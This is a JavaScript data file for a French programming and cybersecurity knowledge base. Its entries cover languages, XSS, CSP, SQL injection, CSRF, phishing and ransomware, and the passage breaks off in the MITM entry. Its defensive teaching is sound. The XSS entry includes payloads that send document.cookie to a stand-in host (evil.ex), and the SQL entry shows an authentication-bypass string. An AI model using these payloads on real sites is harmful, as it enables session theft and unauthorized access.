/* ═════════ CODEX — base de connaissances ═════════
   45 fiches uniques, zéro génération de masse, zéro compteur d'audience.
   Chaque fiche : id, title, cat, tags, level 1-5, danger 0-3, excerpt, infobox, sections.
   (Pas de compteurs de vues : aucun chiffre d'audience affiché ou utilisé.)
*/
window.CATS = {
  langage:{name:"Langages",desc:"Python, JavaScript, Rust, Go… la grammaire des machines. Syntaxe, paradigmes, pièges et cas d'usage.",color:"#FF4D00"},
  cyber:{name:"Cybersécurité",desc:"Failles, attaques et défenses. Comprendre pour protéger : XSS, injections, phishing, ransomware, OSINT.",color:"#ff3b3b"},
  web:{name:"Web & API",desc:"Le web moderne : HTML/CSS, React, Node, REST, GraphQL. Comment ça marche sous le capot.",color:"#4d7dff"},
  systeme:{name:"Système & Réseau",desc:"Linux, Git, Docker, TCP/IP, DNS. Les fondations invisibles sur lesquelles tout repose.",color:"#3ecf8e"},
  concept:{name:"Concepts",desc:"Algorithmes, POO, structures de données. Les idées qui traversent tous les langages.",color:"#e8b400"}
};

const DETAILED = [
{id:"python",title:"Python",cat:"langage",tags:["python","backend","data","ia"],level:1,danger:0,updated:"2026-10-09",read:2,excerpt:"L'un des langages les plus lisibles du monde : simple en surface, redoutable en profondeur. Data, web, IA, scripting.",
related:["javascript","sql","algorithmes"],
sources:[{t:"Documentation officielle — pickle (sécurité)",u:"https://docs.python.org/fr/3/library/pickle.html"},{t:"PEP 20 — La philosophie de Python",u:"https://peps.python.org/pep-0020/"}],
infobox:{Créateur:"Guido van Rossum (1991)",Paradigme:"Multi (objet, fonctionnel)",Typage:"Dynamique, fort",Usage:"Data · Web · IA · Script"},
sections:[
{h:"Définition",body:"<p><b>Python</b> est un langage interprété, à typage dynamique, réputé pour sa lisibilité. Sa philosophie — « il doit y avoir une façon évidente de le faire » — en fait la porte d'entrée idéale vers la programmation, sans l'enfermer aux usages débutants : Instagram, Spotify, la data science et une immense partie de l'IA tournent en Python.</p><div class='tip'>✔ <b>À retenir :</b> lisible ne veut pas dire lent à apprendre — la profondeur vient des écosystèmes (NumPy, Django, FastAPI…), pas de la syntaxe.</div>"},
{h:"Syntaxe essentielle",body:"<p>Indentation significative, pas d'accolades : la structure visuelle <i>est</i> la structure logique.</p>",code:{lang:"python",code:"def fibonacci(n):\n    a, b = 0, 1\n    for _ in range(n):\n        yield a\n        a, b = b, a + b\n\nprint(list(fibonacci(8)))\n# [0, 1, 1, 2, 3, 5, 8, 13]"}},
{h:"Cas d'usage & limites",body:"<ul><li><b>Data / IA :</b> pandas, scikit-learn, PyTorch.</li><li><b>Web :</b> Django (batteries incluses), FastAPI (ultra-rapide).</li><li><b>Scripting / cyber :</b> Scapy, Requests, Impacket — le couteau suisse du pentester.</li><li><b>Limites :</b> le GIL verrouille le multithreading CPU (depuis 3.13, un build expérimental sans GIL via <code>--disable-gil</code> ; officiellement supporté depuis 3.14, mais toujours optionnel), vitesse brute < C/Rust, mobile quasi inexistant.</li></ul>"},
{h:"Dangers & bonnes pratiques",body:"<div class='warn'>⚠ <b>Risques :</b> <code>pickle.loads()</code> sur données non fiables = exécution de code. Côté dépendances, les vrais risques sont le <b>typosquatting</b> (<code>reqeusts</code> au lieu de <code>requests</code>) et la <b>confusion de dépendances</b> : auditez avec <code>pip-audit</code> et figez avec <code>--require-hashes</code>. <code>eval()</code> sur entrée utilisateur ouvre la porte à l'exécution de code arbitraire.</div><p>Environnements virtuels (<code>venv</code>), dépendances épinglées, linter <code>ruff</code>, tests <code>pytest</code> : la discipline fait la robustesse.</p>"}]},

{id:"javascript",title:"JavaScript",cat:"langage",tags:["javascript","frontend","node","web"],level:1,danger:1,updated:"2026-10-09",read:2,excerpt:"Le langage historique du navigateur (rejoint depuis par WebAssembly pour le code compilé). Ubiquitaire, bizarre, génial.",
infobox:{Créateur:"Brendan Eich (1995, 10 jours)",Paradigme:"Prototype, événementiel",Typage:"Dynamique, faible",Usage:"Front · Node · Mobile"},
sections:[
{h:"Définition",body:"<p><b>JavaScript</b> est le langage du web interactif. Exécuté dans chaque navigateur, il pilote le DOM, les requêtes réseau, les animations — et, via <b>Node.js</b>, les serveurs. Son modèle événementiel non-bloquant en fait un champion de l'I/O concurrente.</p>"},
{h:"Le trio à maîtriser",body:"<p>Closures, <code>this</code>, boucle événementielle : la plupart des bugs mystérieux viennent de là.</p>",code:{lang:"javascript",code:"// Event loop : le non-bloquant en 5 lignes\nconsole.log('1');\nsetTimeout(() => console.log('2'), 0);\nPromise.resolve().then(() => console.log('3'));\nconsole.log('4');\n// → 1, 4, 3, 2"}},
{h:"Sécurité côté front",body:"<div class='warn'>⚠ <b>XSS :</b> tout <code>innerHTML</code> nourri de données utilisateur est une faille. Préférez <code>textContent</code>, échappez, et posez une <b>CSP</b> stricte.</div><p>Ne stockez jamais de token sensible en <code>localStorage</code> sur app exposée au XSS — préférez cookies <code>HttpOnly; SameSite</code>.</p>"}]},

{id:"typescript",title:"TypeScript",cat:"langage",tags:["typescript","frontend","backend"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"JavaScript + un système de types qui attrape les bugs avant l'exécution. Le choix courant des applications exigeantes.",
infobox:{Créateur:"Microsoft (2012)",Paradigme:"Sur-ensemble typé de JS",Typage:"Statique, structurel",Usage:"Front · Back · Full-stack"},
sections:[
{h:"Pourquoi typer ?",body:"<p><b>TypeScript</b> ne change pas ce que le code <i>fait</i>, il change ce qu'on peut <i>prouver</i> avant de l'exécuter. Autocomplétion, refactoring sûr, contrats d'API explicites : la productivité grimpe dès que l'équipe dépasse 2 personnes.</p>",code:{lang:"typescript",code:"type User = { id: string; role: 'admin' | 'user' };\n\nfunction canDelete(u: User): boolean {\n  return u.role === 'admin';\n}\n// Erreur attrapée à la compilation, pas en prod."}},
{h:"Règle d'or",body:"<p>Activez <code>strict: true</code>. Un TypeScript laxiste (<code>any</code> partout) coûte plus cher qu'il ne rapporte.</p>"}]},

{id:"csharp",title:"C#",cat:"langage",tags:["c#","dotnet","backend","jeu"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Le fer de lance de .NET : élégant, typé, ultra-outillé. Jeux Unity, backends, desktop Windows.",
infobox:{Créateur:"Microsoft (2000)",Paradigme:"Orienté objet, moderne",Typage:"Statique, fort",Usage:".NET · Unity · Azure"},
sections:[
{h:"Définition",body:"<p><b>C#</b> combine la puissance du typage statique et le confort moderne (LINQ, async/await, pattern matching). Avec <b>.NET</b> multiplateforme, il tourne sur Linux, web (Blazor), cloud et moteurs de jeu.</p>",code:{lang:"csharp",code:"var users = db.Users\n    .Where(u => u.Active)\n    .OrderBy(u => u.Name)\n    .Select(u => u.Email);\n\nawait foreach (var mail in NotifyAsync(users))\n    Console.WriteLine(mail);"}},
{h:"Sécurité",body:"<p>Mémoire gérée (pas de buffer overflow classique), mais restez vigilant sur la <b>désérialisation</b> et les injections SQL via concaténation — utilisez toujours des requêtes paramétrées (Dapper, EF Core).</p>"}]},

{id:"cpp",title:"C++",cat:"langage",tags:["c++","systeme","jeu","performance"],level:4,danger:1,updated:"2026-10-09",read:2,excerpt:"Le contrôle absolu sur la machine : zéro-cost abstractions, mais zéro filet. Moteurs, OS, trading haute fréquence.",
infobox:{Créateur:"Bjarne Stroustrup (1985)",Paradigme:"Multi-paradigme, RAII",Typage:"Statique, faible",Usage:"Jeu · OS · Embarqué · HFT"},
sections:[
{h:"Définition",body:"<p><b>C++</b> donne un contrôle total sur la mémoire et le CPU. Revers : chaque pointeur est une responsabilité. Le <b>RAII</b> (l'acquisition est l'initialisation) et les <i>smart pointers</i> modernes (<code>unique_ptr</code>, <code>shared_ptr</code>) ont rendu le langage nettement plus sûr qu'à l'époque du C pur.</p>",code:{lang:"cpp",code:"#include <memory>\n#include <iostream>\n\nint main() {\n    auto p = std::make_unique<int>(42);\n    std::cout << *p << '\\n';\n} // libération automatique — pas de delete"}},
{h:"Failles historiques",body:"<div class='warn'>⚠ <b>Buffer overflow, use-after-free, double-free :</b> la majorité des CVE critiques des années 2000-2010 viennent du C/C++ non sécurisé. Compilez avec <code>-Wall -Wextra -fsanitize=address,undefined</code>, et envisagez Rust pour le code neuf exposé.</div>"}]},

{id:"c-lang",title:"C",cat:"langage",tags:["c","systeme","embarqué"],level:4,danger:1,updated:"2026-10-09",read:2,excerpt:"L'ancêtre vivant : kernels, microcontrôleurs, tout ce qui doit parler directement au silicium.",
infobox:{Créateur:"Dennis Ritchie (1972)",Paradigme:"Procédural, minimal",Typage:"Statique, faible",Usage:"Kernel · Embarqué · Drivers"},
sections:[
{h:"Pourquoi encore l'apprendre ?",body:"<p>Parce que <b>C</b> est la couche 0 du monde logiciel : Linux, microcontrôleurs, protocoles réseau. Le comprendre, c'est comprendre la mémoire, les pointeurs, la pile et le tas — des notions qui éclairent tous les autres langages.</p>",code:{lang:"c",code:"#include <stdio.h>\n#include <string.h>\n\nint main(void) {\n    char dst[8];\n    // strncpy + terminaison explicite : le réflexe sûr\n    strncpy(dst, \"bonjour\", sizeof(dst) - 1);\n    dst[sizeof(dst)-1] = '\\0';\n    printf(\"%s\\n\", dst);\n}"}},
{h:"Règle vitale",body:"<div class='warn'>⚠ <b>Jamais</b> <code>strcpy</code> / <code>sprintf</code> / <code>gets</code> sur entrée non contrôlée. Vérifiez chaque taille, chaque retour de <code>malloc</code>.</div>"}]},

{id:"rust",title:"Rust",cat:"langage",tags:["rust","systeme","sécurité"],level:4,danger:0,updated:"2026-10-09",read:2,excerpt:"Performance du C, sécurité en plus : le borrow checker refuse de compiler le code dangereux. Adopté par Linux, Firefox, AWS.",
infobox:{Créateur:"Mozilla / Graydon Hoaré (2010)",Paradigme:"Ownership, traits",Typage:"Statique, inféré",Usage:"Système · Cloud · WASM"},
sections:[
{h:"L'idée géniale : l'ownership",body:"<p>En <b>Rust</b>, chaque valeur a un <i>propriétaire unique</i>. Le compilateur suit qui lit, qui emprunte, qui libère — et <b>refuse</b> les data races et use-after-free <i>avant</i> l'exécution. On déplace les bugs de la prod vers le compilateur.</p>",code:{lang:"rust",code:"fn main() {\n    let s = String::from(\"hello\");\n    let len = calc(&s); // emprunt immuable : ok\n    println!(\"{s} fait {len} lettres\");\n}\nfn calc(s: &str) -> usize { s.len() }"}},
{h:"Quand l'utiliser ?",body:"<p>Drivers, réseau, CLI, WebAssembly, tout ce qui est exposé et doit être rapide <i>et</i> sûr. Courbe d'apprentissage réelle (comptez 3-4 semaines pour le déclic), rentabilité immense ensuite.</p>"}]},

{id:"go",title:"Go (Golang)",cat:"langage",tags:["go","backend","cloud","devops"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Simple, compilé, concurrent par design : le langage des infrastructures cloud (Docker, Kubernetes).",
infobox:{Créateur:"Google (2009)",Paradigme:"Procédural, goroutines",Typage:"Statique",Usage:"Cloud · API · DevOps"},
sections:[
{h:"Définition",body:"<p><b>Go</b> mise sur la simplicité volontaire : peu de mots-clés, compilation éclair, déploiement en un binaire. Ses <b>goroutines</b> rendent la concurrence aussi simple qu'un mot-clé.</p>",code:{lang:"go",code:"package main\n\nimport \"fmt\"\n\nfunc main() {\n    ch := make(chan string)\n    go func() { ch <- \"bonjour depuis une goroutine\" }()\n    fmt.Println(<-ch)\n}"}}]},

{id:"java",title:"Java",cat:"langage",tags:["java","backend","android"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"« Write once, run anywhere ». Banques, Android, backends massifs : l'infatigable cheval de trait.",
infobox:{Créateur:"Sun Microsystems (1995)",Paradigme:"Orienté objet, JVM",Typage:"Statique, fort",Usage:"Banque · Android · Big Data"},
sections:[
{h:"Définition",body:"<p><b>Java</b> tourne sur la <b>JVM</b>, machine virtuelle présente partout. Écosystème immense (Spring, Hibernate), outillage mature, et performances excellentes grâce à la compilation JIT. Verbeux historiquement, bien plus concis depuis les versions 17+ (records, pattern matching).</p>"},
{h:"Point de vigilance",body:"<div class='warn'>⚠ <b>Log4Shell (2021)</b> l'a rappelé : une dépendance de logging peut ouvrir une exécution de code à distance. Auditez vos dépendances (Dependabot, Snyk) et tenez la JVM à jour.</div>"}]},

{id:"php",title:"PHP",cat:"langage",tags:["php","web","backend"],level:1,danger:1,updated:"2026-10-09",read:2,excerpt:"PHP fait tourner une part immense du web (WordPress, PrestaShop, Symfony, Laravel). Moqué, puis ressuscité : PHP 8 est rapide et sain.",
infobox:{Créateur:"Rasmus Lerdorf (1994)",Paradigme:"Script web, objet",Typage:"Dynamique progressif",Usage:"Web · CMS · E-commerce"},
sections:[
{h:"Définition",body:"<p><b>PHP</b> s'exécute côté serveur et génère le HTML. Déployé partout, simple à héberger, il propulse WordPress, PrestaShop, Symfony et Laravel — ce dernier rivalisant avec les meilleurs frameworks tous langages confondus.</p>",code:{lang:"php",code:"<?php\n// Requête sûre avec PDO : jamais de concaténation SQL\n$stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?');\n$stmt->execute([$email]);\n$user = $stmt->fetch();"}},
{h:"Sécurité",body:"<div class='warn'>⚠ L'image « PHP = passoire » vient des vieux tutos (<code>mysql_query</code>, <code>$_GET</code> non filtré). Avec PDO, <code>htmlspecialchars()</code>, mises à jour et HTTPS, PHP 8 est aussi sûr que ses concurrents.</div>"}]},

{id:"ruby",title:"Ruby",cat:"langage",tags:["ruby","web"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Élégant et expressif : le bonheur du développeur. Rails, scripts, productivité — le langage qui se lit comme une phrase.",
infobox:{Créateur:"Yukihiro Matsumoto (1995)",Paradigme:"Tout-objet, expressif",Usage:"Web · Rails · Scripts"},
sections:[
{h:"Philosophie",body:"<p><b>Ruby</b> optimise le bonheur du développeur : syntaxe douce, tout est objet (même les nombres), et <b>Rails</b> a prouvé qu'on pouvait shipper vite <i>et</i> propre.</p>",code:{lang:"ruby",code:"3.times { |i| puts \"essai #{i}\" }\n\n# Se lit comme une phrase\nuser.admin? ? ouvrir_dashboard : accueil"}},
{h:"Quand l'utiliser ?",body:"<ul><li><b> Rails :</b> MVP, SaaS, e-commerce (Shopify, GitHub au départ).</li><li><b>Scripts :</b> DevOps, automatisation, scraping.</li><li><b>Limites :</b> vitesse brute et concurrence < Go/Rust ; écosystème front inexistant.</li></ul>"}]},

{id:"swift",title:"Swift",cat:"langage",tags:["swift","mobile","apple"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Le langage d'Apple : sûr, rapide, moderne. iOS, macOS, et désormais le serveur.",
infobox:{Créateur:"Apple (2014)",Paradigme:"Sûr, optionnels",Usage:"iOS · macOS · Serveur"},
sections:[
{h:"L'idée : la sécurité d'abord",body:"<p><b>Swift</b> a tué des familles entières de bugs : les <b>optionnels</b> forcent à gérer l'absence de valeur, la mémoire est gérée (ARC), et le typage est strict sans être verbeux.</p>",code:{lang:"swift",code:"var pseudo: String? = nil\n\n// Déballage explicite : pas de null surprise\nif let nom = pseudo {\n    print(\"bonjour \\(nom)\")\n} else {\n    print(\"bonjour invité\")\n}"}},
{h:"Écosystème",body:"<p>SwiftUI (UI déclarative), Vapor côté serveur, et du code de plus en plus partagé avec le C++. Porte d'entrée obligée pour l'App Store.</p>"}]},

{id:"kotlin",title:"Kotlin",cat:"langage",tags:["kotlin","android","jvm"],level:2,danger:0,updated:"2026-10-09",read:2,excerpt:"Le Java en mieux : concis, null-safe, interopérable avec tout le code Java existant. Langage officiel d'Android.",
infobox:{Créateur:"JetBrains (2011)",Paradigme:"Pragmatique, null-safe",Usage:"Android · Backend · JVM"},
sections:[
{h:"Pourquoi il a gagné",body:"<p><b>Kotlin</b> corrige Java sans le casser : nettement moins de code, <b>null-safety</b> intégrée, coroutines pour l'asynchrone, et appel direct à toutes les libs Java existantes.</p>",code:{lang:"kotlin",code:"fun saluer(nom: String?): String {\n    // Elvis : valeur par défaut si null\n    return \"bonjour ${nom ?: \"invité\"}\"\n}\n\nprintln(saluer(null))  // bonjour invité"}},
{h:"Au-delà d'Android",body:"<p>Ktor et Spring supportent Kotlin côté serveur ; Kotlin Multiplatform partage la logique entre Android et iOS.</p>"}]},

{id:"sql",title:"SQL",cat:"langage",tags:["sql","données","base"],level:2,danger:1,updated:"2026-10-09",read:2,excerpt:"Le langage des données depuis 50 ans : interroger, joindre, agréger. Indispensable, partout.",
infobox:{Créateur:"IBM / Chamberlin (1974)",Paradigme:"Déclaratif, relationnel",Usage:"Bases · Data · Backend"},
sections:[
{h:"Déclaratif, pas impératif",body:"<p>En <b>SQL</b> on décrit <i>ce qu'on veut</i>, pas comment l'obtenir : le moteur optimise. Trois verbes couvrent l'essentiel des besoins quotidiens : <code>SELECT</code>, <code>JOIN</code>, <code>GROUP BY</code>.</p>",code:{lang:"sql",code:"SELECT auteur, COUNT(*) AS fiches\nFROM articles\nWHERE cat = 'cyber'\nGROUP BY auteur\nORDER BY fiches DESC\nLIMIT 5;"}},
{h:"Sécurité",body:"<div class='warn'>⚠ Requêtes concaténées = injection SQL (voir la fiche dédiée). Toujours des <b>requêtes préparées</b>, un compte aux privilèges minimaux, et des sauvegardes.</div>"}]},

/* ── CYBER ── */
{id:"xss",title:"Faille XSS",cat:"cyber",tags:["xss","web","injection","owasp"],level:2,danger:3,updated:"2026-10-09",read:2,excerpt:"Cross-Site Scripting : injecter du JavaScript dans la page d'un autre. Vol de session, défiguration, actions pirates.",
related:["sql-injection","csrf","csp"],
sources:[{t:"OWASP — XSS Prevention Cheat Sheet",u:"https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"},{t:"OWASP Top 10",u:"https://owasp.org/Top10/"}],
infobox:{Type:"Injection côté client",Gravité:"Critique",Famille:"OWASP Top 10",Parade:"Échappement + CSP stricte"},
sections:[
{h:"Mécanisme",body:"<p>Une <b>XSS</b> survient quand une application réinjecte une entrée utilisateur dans le HTML <b>sans échappement</b>. Le navigateur exécute alors le code de l'attaquant <i>dans le contexte du site victime</i> : lecture de données, actions au nom de l'utilisateur, keylogging.</p><table class='fiche'><tr><th>Type</th><th>Où vit le payload</th><th>Exemple</th></tr><tr><td>Réfléchie</td><td>URL / réponse immédiate</td><td>Lien piégé</td></tr><tr><td>Stockée</td><td>Base de données</td><td>Commentaire vérolé</td></tr><tr><td>DOM-based</td><td>JS côté client</td><td><code>location.hash</code></td></tr></table>"},
{h:"Exemple d'attaque",body:"<p>Deux cas très différents :</p><ul><li><b>Injection côté serveur :</b> le commentaire est soudé tel quel dans le HTML renvoyé — un <code>&lt;script&gt;</code> classique s'exécute au chargement de la page.</li><li><b>Injection via <code>innerHTML</code> :</b> attention, un <code>&lt;script&gt;</code> inséré ainsi <b>ne s'exécute pas</b> (c'est la spécification HTML). L'attaquant utilise un vecteur événementiel :</li></ul>",code:{lang:"html",code:"<!-- Commentaire attaquant, inséré via innerHTML -->\n<img src=\"x\" onerror=\"fetch('https://evil.ex/?c='+document.cookie)\">\n\n<!-- Variante serveur (soudée au HTML) : le script, lui, s'exécute -->\n<script>fetch('https://evil.ex/?c='+document.cookie)</script>"}},
{h:"Parades",body:"<ul><li><b>textContent plutôt que innerHTML</b>, systématiquement, pour insérer du texte.</li><li>HTML riche indispensable (éditeur, commentaires formatés) ? <b>Assainissez avec DOMPurify</b> avant insertion — jamais de HTML brut.</li><li><b>Méfiez-vous des trappes des frameworks</b> : <code>dangerouslySetInnerHTML</code> (React), <code>v-html</code> (Vue). L'échappement par défaut ne vous y protège pas.</li><li><b>CSP stricte</b> : <code>script-src</code> avec <b>nonces</b> ou <b>hashes</b>, plus <code>'strict-dynamic'</code> (voir la fiche <a href='/article/csp/'><u>Content Security Policy</u></a>). Un simple <code>'self'</code> ne suffit pas : contournable si un JavaScript téléversable existe sur votre domaine.</li><li>Auditez avec OWASP ZAP / Burp Suite en relisant chaque <i>sink</i> (<code>innerHTML</code>, <code>document.write</code>, <code>eval</code>).</li></ul><div class='tip'>✔ <b>Limiter l'impact (sans empêcher la faille) :</b> cookies de session en <code>HttpOnly; Secure; SameSite=Lax</code>. Cela bloque le vol via <code>document.cookie</code> — mais pas les actions exécutées au nom de la victime connectée.</div>"}]},

{id:"csp",title:"Content Security Policy (CSP)",cat:"web",tags:["csp","web","xss","headers"],level:3,danger:0,updated:"2026-10-09",read:2,excerpt:"Dire au navigateur quels scripts ont le droit de tourner : nonces, hashes, strict-dynamic. Une défense en profondeur — l'échappement reste la première protection.",
parent:"xss",
related:["xss","http","csrf"],
sources:[{t:"MDN — Content Security Policy",u:"https://developer.mozilla.org/fr/docs/Web/HTTP/CSP"},{t:"OWASP — Content Security Policy Cheat Sheet",u:"https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"}],
infobox:{Type:"En-tête HTTP de sécurité",Clé:"script-src + nonces",À_bannir:"'unsafe-inline'"},
sections:[
{h:"Le principe : liste blanche déclarative",body:"<p>Le serveur envoie un en-tête qui dit au navigateur <b>d'où chaque type de ressource peut venir</b> : scripts, styles, images, frames, formulaires. Tout le reste est bloqué — y compris un script injecté par XSS.</p><p>Retenez l'ordre : la CSP <b>ne remplace pas l'échappement</b> de sortie, c'est une seconde barrière qui limite les dégâts quand une injection passe quand même.</p>",code:{lang:"http",code:"Content-Security-Policy:\n  default-src 'self';\n  script-src 'nonce-r4nd0m' 'strict-dynamic';\n  object-src 'none';\n  base-uri 'self'; form-action 'self'"}},
{h:"Nonces, hashes et strict-dynamic",body:"<ul><li><b>Nonce :</b> un jeton aléatoire unique par page, recopié sur chaque <code>&lt;script nonce=\"…\"&gt;</code> légitime. Un script injecté n'a pas le bon nonce → bloqué.</li><li><b>Hash :</b> autorise un script inline précis par son empreinte (pratique pour un snippet figé).</li><li><b>'strict-dynamic' :</b> fait confiance aux scripts chargés par un script autorisé — très utile avec les bundlers modernes. Notez que les navigateurs compatibles <b>ignorent alors 'self' et les listes de domaines</b> dans <code>script-src</code>.</li></ul><p>Ci-dessus, <code>'nonce-r4nd0m'</code> est un <b>exemple</b> : en production, nonce aléatoire d'au moins 128 bits, <b>régénéré à chaque réponse</b>.</p><div class='warn'>⚠ <code>script-src 'self'</code> <b>seul</b> n'est pas une CSP stricte : si l'attaquant peut faire héberger un fichier JS sur votre domaine (upload, JSONP, bibliothèque compromise), le navigateur l'exécute.</div>"},
{h:"Déployer sans tout casser",body:"<ul><li>Commencez en <b>Content-Security-Policy-Report-Only</b> : les violations sont signalées, rien n'est bloqué.</li><li>Collectez les rapports (<code>report-uri</code>, remplacé progressivement par <code>report-to</code> : mentionnez les deux pendant la transition), corrigez, puis basculez en mode blocage.</li><li>Bannissez <code>'unsafe-inline'</code> et <code>'unsafe-eval'</code> : ils annulent l'essentiel de la protection.</li></ul>"}]},

{id:"sql-injection",title:"Injection SQL",cat:"cyber",tags:["sqli","base","owasp","backend"],level:2,danger:3,updated:"2026-10-09",read:2,related:["xss","csrf","api-rest"],excerpt:"Manipuler la requête SQL d'une app pour lire, modifier ou effacer sa base. Vieille comme le web, toujours dévastatrice.",
infobox:{Type:"Injection serveur",Gravité:"Critique",Famille:"OWASP Top 10",Parade:"Requêtes préparées"},
sections:[
{h:"Mécanisme",body:"<p>Si l'app concatène l'entrée utilisateur dans du SQL, l'attaquant <b>sort du champ</b> et réécrit la requête : authentification contournée, dump complet, parfois exécution système.</p>",code:{lang:"sql",code:"-- Code vulnérable :\n-- query = \"SELECT * FROM users WHERE login='\" + input + \"'\";\n-- Entrée :  ' OR '1'='1' --\nSELECT * FROM users WHERE login='' OR '1'='1' --'\n-- → connecte le premier compte (souvent admin)."}},
{h:"Parades",body:"<ul><li><b>Requêtes préparées / ORM</b> partout, sans exception.</li><li>Principe du moindre privilège sur le compte SQL.</li><li>Messages d'erreur génériques (jamais de SQL brut au client).</li><li>WAF + tests d'intrusion réguliers.</li></ul><div class='warn'>⚠ Les injections <b>aveugles</b> (blind) exfiltrent des données bit par bit via des questions vrai/faux — même sans affichage d'erreur, vous pouvez fuiter.</div>"}]},

{id:"csrf",title:"Faille CSRF",cat:"cyber",tags:["csrf","web","session"],level:3,danger:2,updated:"2026-10-09",read:2,related:["xss","authentification","sql-injection"],excerpt:"Cross-Site Request Forgery : forcer le navigateur d'une victime connectée à exécuter une action à son insu.",
infobox:{Type:"Abus de session",Gravité:"Moyenne à haute",Parade:"Token anti-CSRF + SameSite"},
sections:[
{h:"Mécanisme",body:"<p>La victime visite une page piégée qui déclenche une requête vers le site où elle est <b>connectée</b> (virement, changement d'email…). Le navigateur joint les cookies tout seul : le site obéit.</p>"},
{h:"Parades",body:"<ul><li><b>Token anti-CSRF</b> unique par formulaire / requête modifiante.</li><li>Cookies <code>SameSite=Lax/Strict</code>.</li><li>Vérifier <code>Origin/Referer</code> côté serveur.</li><li>Actions sensibles en POST + re-authentification.</li></ul>"}]},

{id:"phishing",title:"Phishing (hameçonnage)",cat:"cyber",tags:["phishing","social","email"],level:1,danger:3,updated:"2026-10-09",read:2,excerpt:"Une attaque massive : un message qui imite un tiers de confiance pour voler identifiants et argent.",
related:["social-engineering","authentification","ransomware"],
sources:[{t:"Cybermalveillance — fiche hameçonnage : que faire",u:"https://www.cybermalveillance.gouv.fr/tous-nos-contenus/fiches-reflexes/hameconnage-phishing"},{t:"Signal Spam — signaler un e-mail",u:"https://www.signal-spam.fr/"},{t:"33700 — SMS et appels indésirables",u:"https://www.33700.fr/"},{t:"THESEE — plainte en ligne (service-public.fr)",u:"https://www.service-public.gouv.fr/particuliers/vosdroits/N31138"}],
infobox:{Type:"Ingénierie sociale",Gravité:"Critique (porte d'entrée)",Vecteur:"Email · SMS · Appel · QR code"},
sections:[
{h:"Anatomie d'une campagne",body:"<ul><li><b>Prétexte :</b> colis bloqué, compte suspendu, facture urgente.</li><li><b>Urgence :</b> « agir sous 24 h » pour court-circuiter la réflexion.</li><li><b>Faux domaine :</b> <code>support-banque-secu.com</code>, homoglyphes (rn → m).</li><li><b>Récolte :</b> fausse page de login → identifiants, puis code à usage unique retapé et rejoué en direct.</li></ul><p>Le vocabulaire : <b>smishing</b> (par SMS), <b>vishing</b> (par appel vocal), <b>spear phishing</b> (ciblé sur vous ou votre entreprise), <b>quishing</b> (via QR code).</p>"},
{h:"Se défendre",body:"<ul><li>Vérifiez l'<b>expéditeur réel</b> : le nom affiché ment, regardez l'adresse complète. Survolez les liens sans cliquer, et n'entrez jamais sur un site via un lien reçu — tapez l'adresse vous-même.</li><li><b>Codes SMS et applis (y compris TOTP) :</b> ils ne protègent pas si vous les retapez sur un faux site qui les rejoue aussitôt. Seules les <b>passkeys / clés FIDO2</b> résistent à ce rejeu en direct.</li><li><b>Signaler :</b> SMS et appels indésirables → <b>33700</b> ; e-mails → <b>Signal Spam</b> (signal-spam.fr).</li></ul><div class='tip'>✔ Réflexe : un message qui demande un secret ou un paiement urgent = suspect par défaut. Vérifiez par un <b>second canal</b> (appelez l'organisme au numéro officiel).</div>"},
{h:"J'ai cliqué, que faire ?",body:"<p>Pas de panique, agissez vite et dans l'ordre :</p><ul><li><b>1. Coupez :</b> fermez la page, ne retapez plus rien, déconnectez vos sessions si possible.</li><li><b>2. Changez les mots de passe</b> concernés depuis un appareil sain — et partout où ils étaient réutilisés.</li><li><b>3. Carte bancaire saisie ?</b> Faites <b>opposition</b> et prévenez votre banque immédiatement.</li><li><b>4. Faites-vous accompagner</b> sur <b>cybermalveillance.gouv.fr</b> (diagnostic gratuit + mise en relation avec des prestataires).</li><li><b>5. Déposez plainte</b> (commissariat, gendarmerie, pré-plainte en ligne — ou <b>THESEE</b> en ligne pour les arnaques internet).</li><li><b>Logiciel de prise en main installé</b> à la demande d'un faux conseiller ? <b>Coupez internet immédiatement</b> et faites analyser l'appareil par un professionnel avant toute réutilisation.</li><li><b>6. Surveillez</b> comptes et relevés pendant les semaines suivantes.</li></ul>"}]},

{id:"ransomware",title:"Ransomware (rançongiciel)",cat:"cyber",tags:["ransomware","malware","entreprise"],level:2,danger:3,updated:"2026-10-09",read:2,related:["sauvegardes","malware","phishing"],excerpt:"Chiffrement des données + chantage à la fuite : comprendre l'extorsion numérique pour s'en prémunir.",
infobox:{Type:"Malware + extorsion",Gravité:"Critique",Modèle:"RaaS (affiliation)",Parade:"Sauvegardes 3-2-1"},
sections:[
{h:"Double / triple extorsion",body:"<p>1) <b>Chiffrement</b> des fichiers. 2) <b>Menace de publication</b> des données volées. 3) Parfois <b>DDoS</b> ou pression sur les clients. Les groupes fonctionnent en <b>RaaS</b> : les développeurs louent le malware à des affiliés contre 20-30 % des rançons.</p>"},
{h:"Chaîne d'attaque typique",body:"<ul><li>Phishing / RDP exposé / faille VPN non patchée → accès initial.</li><li>Élévation, mouvement latéral, repérage des sauvegardes.</li><li>Exfiltration puis chiffrement nocturne / le week-end.</li></ul>"},
{h:"Parades qui marchent",body:"<ul><li><b>3-2-1 :</b> 3 copies, 2 supports, 1 hors-ligne/hors-site, <b>testées</b>.</li><li>Patchs < 30 jours, MFA partout, EDR, segmentation réseau.</li><li>Plan de réponse : qui débranche quoi, qui appelle l'ANSSI, sauvegardes juridiques.</li></ul><div class='warn'>⚠ Payer ne garantit ni la clé, ni la suppression des données. En France, signalez via le <b>17Cyber</b> et l'ANSSI.</div>"}]},

{id:"mitm",title:"Attaque Man-in-the-Middle",cat:"cyber",tags:["mitm","réseau","wifi","tls"],level:3,danger:2,updated:"2026-10-09",read:2,related:["wifi-securite","dns","cryptographie"],excerpt:"S'intercaler entre vous et le serveur : Wi-Fi piégé, ARP spoofing, proxy malveillant. TLS bien configuré = mur.",
infobox:{Type:"Interception réseau",Gravité:"Moyenne à haute",Parade:"HTTPS strict + HSTS"},
sections:[
